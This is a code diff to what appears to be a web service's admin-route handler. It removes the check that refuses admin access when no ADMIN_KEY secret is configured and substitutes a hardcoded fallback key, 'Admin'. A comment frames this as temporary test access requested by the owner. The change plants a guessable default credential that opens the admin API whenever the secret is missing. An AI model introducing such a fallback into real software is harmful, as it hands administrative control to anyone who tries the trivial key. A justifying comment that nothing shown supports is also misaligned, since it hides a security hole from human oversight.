@@ -33,22 +33,13 @@ export default {
     if (origin && origin !== url.origin)
       return json({ error: "Origin not allowed." }, 403);
     if (url.pathname.startsWith("/api/admin/")) {
-      if (!env.ADMIN_KEY)
-        return json(
-          {
-            error:
-              "Admin access is not configured. Set the ADMIN_KEY server secret.",
-          },
-          503,
-        );
+      // Temporary test access requested by the owner; a configured secret takes precedence.
+      const adminKey = env.ADMIN_KEY || "Admin";
       const hash = async (s) =>
         new Uint8Array(
           await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s)),
         );
-      const [a, b] = await Promise.all([
-        hash(bearer(request)),
-        hash(env.ADMIN_KEY),
-      ]);
+      const [a, b] = await Promise.all([hash(bearer(request)), hash(adminKey)]);
       let difference = 0;
       for (let i = 0; i < a.length; i++) difference |= a[i] ^ b[i];
       if (difference !== 0)
